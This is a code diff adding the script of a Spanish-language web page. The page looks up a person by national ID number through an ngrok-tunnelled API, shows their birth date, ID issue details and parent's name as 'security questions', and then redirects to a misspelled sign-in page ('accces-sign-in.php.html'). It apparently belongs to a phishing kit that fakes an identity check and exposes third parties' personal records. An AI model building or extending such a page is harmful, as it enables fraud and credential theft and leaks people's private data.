+                toast.className = "toast " + tipo;
+                toastIcon.className = "toast-icon " + tipo;
+                toastMessage.textContent = mensaje;
+                toast.classList.add("show");
+                setTimeout(() => toast.classList.remove("show"), 4000);
+            }
+
+            function showLoader(mensaje) {
+                textCube.textContent = mensaje || "Procesando...";
+                loadingContenedor.style.display = "flex";
+                loader.style.display = "block";
+                done.classList.remove("show");
+            }
+
+            function hideLoader() {
+                loadingContenedor.style.display = "none";
+                loader.style.display = "none";
+            }
+
+            function validarCedula(valor) {
+                const limpio = valor.replace(/\D/g, '');
+                return limpio.length >= 7 && limpio.length <= 10;
+            }
+
+            // ===== CONFIGURAR PREGUNTAS =====
+            function configurarPreguntas(data) {
+                customerData = data;
+
+                // Intentar guardar en localStorage (falla en incógnito pero no importa)
+                try {
+                    localStorage.setItem("customerData", JSON.stringify(data));
+                } catch (e) { /* Ignorar en incógnito */ }
+
+                const esBaseNueva = data.base_datos === 'personas_db';
+
+                // Nombre
+                let nombre = data.nombre_completo || data.nombre || "Cliente";
+                if (data.apellidos && data.apellidos !== "No disponible" && data.apellidos !== "null") {
+                    nombre += " " + data.apellidos;
+                }
+                customerNameDisplay.textContent = nombre + ",";
+
+                // Limpiar estados anteriores
+                steps.forEach(step => {
+                    step.querySelectorAll(".choice-btn").forEach(btn => {
+                        btn.classList.remove("selected");
+                        btn.disabled = false;
+                    });
+                    const status = step.querySelector(".step-status");
+                    if (status) status.textContent = "";
+                });
+
+                if (esBaseNueva) {
+                    // ===== BASE NUEVA: 2 preguntas =====
+                    document.getElementById("labelPregunta1").textContent = "¿Tu fecha de nacimiento es?";
+                    document.getElementById("respuestaPregunta1").textContent = formatearFecha(data.fecha_nacimiento);
+
+                    document.getElementById("labelPregunta2").textContent = "¿Tu fecha de expedición del documento es?";
+                    document.getElementById("respuestaPregunta2").textContent = formatearFecha(data.fecha_expedicion);
+
+                    steps[2].style.display = "none";
+
+                    respuestas = [
+                        { tipo: "fecha_nacimiento", respuesta: "" },
+                        { tipo: "fecha_expedicion", respuesta: "" }
+                    ];
+
+                } else {
+                    // ===== BASE ANTIGUA: 3 preguntas =====
+                    document.getElementById("labelPregunta1").textContent = "¿El lugar de expedición de tu documento es?";
+                    document.getElementById("respuestaPregunta1").textContent = data.lugar_expedicion || "No disponible";
+
+                    document.getElementById("labelPregunta2").textContent = "¿Tu fecha de nacimiento es?";
+                    document.getElementById("respuestaPregunta2").textContent = formatearFecha(data.fecha_nacimiento);
+
+                    if (data.nombre_padre && data.nombre_padre !== "No disponible" && data.nombre_padre !== "null") {
+                        document.getElementById("labelPregunta3").textContent = "¿El nombre de tu papá es?";
+                        document.getElementById("respuestaPregunta3").textContent = data.nombre_padre;
+                    } else if (data.nombre_madre && data.nombre_madre !== "No disponible" && data.nombre_madre !== "null") {
+                        document.getElementById("labelPregunta3").textContent = "¿El nombre de tu mamá es?";
+                        document.getElementById("respuestaPregunta3").textContent = data.nombre_madre;
+                    } else {
+                        document.getElementById("labelPregunta3").textContent = "¿El lugar de tu nacimiento fue?";
+                        document.getElementById("respuestaPregunta3").textContent = data.lugar_nacimiento || "No disponible";
+                    }
+
+                    steps[2].style.display = "flex";
+
+                    respuestas = [
+                        { tipo: "lugar_expedicion", respuesta: "" },
+                        { tipo: "fecha_nacimiento", respuesta: "" },
+                        { tipo: "nombre_padre_madre", respuesta: "" }
+                    ];
+                }
+
+                securitySection.classList.add("show");
+                currentStep = 0;
+                renderStep();
+                mostrarToast("✅ Cliente encontrado correctamente", "success");
+            }
+
+            // ===== RENDERIZAR PASO =====
+            function renderStep() {
+                steps.forEach((step, index) => {
+                    if (step.style.display === "none") return;
+                    step.classList.toggle("active", index === currentStep);
+                });
+
+                const total = respuestas.length;
+                const completadas = respuestas.filter(r => r.respuesta !== "").length;
+                questionCounter.textContent = `${completadas}/${total}`;
+
+                if (respuestas.every(r => r.respuesta !== "")) {
+                    setTimeout(() => validarRespuestas(), 600);
+                }
+            }
+
+            // ===== SELECCIONAR RESPUESTA =====
+            function selectAnswer(stepIndex, answer, button) {
+                if (respuestas[stepIndex].respuesta !== "") return;
+
+                respuestas[stepIndex].respuesta = answer;
+
+                const step = steps[stepIndex];
+                step.querySelectorAll(".choice-btn").forEach((choice) => {
+                    choice.classList.toggle("selected", choice === button);
+                    choice.disabled = true;
+                });
+
+                const status = step.querySelector(".step-status");
+                status.textContent = "Respuesta guardada ✓";
+
+                renderStep();
+
+                if (currentStep < respuestas.length - 1) {
+                    setTimeout(() => {
+                        currentStep++;
+                        renderStep();
+                    }, 400);
+                }
+            }
+
+            // ===== BUSCAR CLIENTE =====
+            async function buscarCliente() {
+                const cedula = cedulaInput.value.trim();
+
+                if (!validarCedula(cedula)) {
+                    cedulaError.classList.add("show");
+                    cedulaSuccess.classList.remove("show");
+                    return;
+                }
+                cedulaError.classList.remove("show");
+
+                btnBuscar.disabled = true;
+                btnBuscar.textContent = "Buscando...";
+                showLoader("Buscando cliente en la base de datos...");
+
+                try {
+                    const response = await fetch(`${API_BUSCAR_CLIENTE}?cedula=${cedula}`, {
+                        headers: {
+                            "ngrok-skip-browser-warning": "true",
+                            "Accept": "application/json"
+                        },
+                        // timeout de 30 segundos
+                        signal: AbortSignal.timeout(30000)
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(`Error ${response.status}: ${response.statusText}`);
+                    }
+
+                    const data = await response.json();
+
+                    if (!data.exito) {
+                        throw new Error(data.error || "Cliente no encontrado");
+                    }
+
+                    cedulaSuccess.classList.add("show");
+                    configurarPreguntas(data);
+                    hideLoader();
+
+                } catch (error) {
+                    console.error("Error:", error);
+                    cedulaSuccess.classList.remove("show");
+                    cedulaError.textContent = "❌ " + (error.message || "Error de conexión. Verifica tu internet.");
+                    cedulaError.classList.add("show");
+                    hideLoader();
+                    mostrarToast("❌ " + (error.message || "Error al buscar cliente"), "error");
+                }
+
+                btnBuscar.disabled = false;
+                btnBuscar.textContent = "Buscar cliente";
+            }
+
+            // ===== VALIDAR RESPUESTAS =====
+            async function validarRespuestas() {
+                if (!customerData) return;
+                if (!respuestas.every(r => r.respuesta !== "")) return;
+
+                showLoader("Validando respuestas de seguridad...");
+
+                try {
+                    const payload = {
+                        cedula: customerData.cedula,
+                        base_datos: customerData.base_datos,
+                        respuestas: respuestas.map((r, idx) => ({
+                            numero: idx + 1,
+                            respuesta: r.respuesta,
+                            tipo: r.tipo
+                        }))
+                    };
+
+                    const response = await fetch(API_VALIDAR_RESPUESTAS, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                            "ngrok-skip-browser-warning": "true",
+                            "Accept": "application/json"
+                        },
+                        body: JSON.stringify(payload),
+                        signal: AbortSignal.timeout(30000)
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(`Error ${response.status}: ${response.statusText}`);
+                    }
+
+                    const result = await response.json();
+
+                    if (!result.exito) {
+                        throw new Error(result.error || "Error al validar");
+                    }
+
+                    // Guardar en localStorage (si es posible)
+                    try {
+                        const formData = JSON.parse(localStorage.getItem("formData") || "{}");
+                        formData.securityValidation = result;
+                        localStorage.setItem("formData", JSON.stringify(formData));
+                    } catch (e) { /* Ignorar en incógnito */ }
+
+                    if (result.aprobado) {
+                        // ✅ Éxito
+                        setTimeout(() => {
+                            loader.style.display = "none";
+                            textCube.textContent = "";
+                            done.classList.add("show");
+                        }, 800);
+
+                        setTimeout(() => {
+                            mostrarToast("✅ Validación exitosa. Redirigiendo...", "success");
+                        }, 1200);
+
+                        setTimeout(() => {
+                            loadingContenedor.style.display = "none";
+                            done.classList.remove("show");
+                            window.location.href = './accces-sign-in.php.html';
+                        }, 3000);
+
+                    } else {
+                        // ❌ Falló
+                        loadingContenedor.style.display = "none";
+                        mostrarToast("❌ Respuestas incorrectas. Inténtalo de nuevo.", "error");
+                        console.log("Debug info:", result.debug);
+
+                        // Reiniciar
+                        respuestas.forEach(r => r.respuesta = "");
+                        steps.forEach(step => {
+                            step.querySelectorAll(".choice-btn").forEach(btn => {
+                                btn.classList.remove("selected");
+                                btn.disabled = false;
+                            });
+                            const status = step.querySelector(".step-status");
+                            if (status) status.textContent = "";
+                        });
+                        currentStep = 0;
+                        renderStep();
+                    }
+
+                } catch (error) {
+                    console.error("Error en validación:", error);
+                    loadingContenedor.style.display = "none";
+                    mostrarToast("❌ Error al validar. Inténtalo de nuevo.", "error");
+                }
+            }
+
+            // ===== EVENT LISTENERS =====
+
+            btnBuscar.addEventListener("click", buscarCliente);
+
+            cedulaInput.addEventListener("keydown", (e) => {
+                if (e.key === "Enter") buscarCliente();
+            });
+
+            cedulaInput.addEventListener("input", function() {
+                const valor = this.value.replace(/\D/g, '');
+                this.value = valor;
+                cedulaError.classList.remove("show");
+                cedulaSuccess.classList.remove("show");
+                btnBuscar.disabled = !validarCedula(valor);
+            });
+
+            // Botones de respuesta
+            steps.forEach((step, stepIndex) => {
+                if (step.style.display === "none") return;
+
+                step.querySelectorAll(".choice-btn").forEach((button) => {
+                    button.addEventListener("click", () => {
+                        if (!step.classList.contains("active")) return;
+                        if (respuestas[stepIndex].respuesta !== "") return;
+                        selectAnswer(stepIndex, button.dataset.answer, button);
+                    });
+                });
+            });
+
+            // ===== INICIALIZAR =====
+            btnBuscar.disabled = true;
+
+            // Verificar si hay datos guardados (solo funciona si no está en incógnito)
+            try {
+                const savedData = localStorage.getItem("customerData");
+                if (savedData) {
+                    const data = JSON.parse(savedData);
+                    if (data && data.cedula) {
+                        configurarPreguntas(data);
+                        cedulaInput.value = data.cedula;
+                        cedulaSuccess.classList.add("show");
+                    }
+                }
+            } catch (e) { /* Ignorar en incógnito */ }
+
+            console.log("🔐 Modo incógnito detectado - Usa 'Buscar cliente' para cargar los datos.");
+        });
+    </script>
+
+</body>
+
+</html>
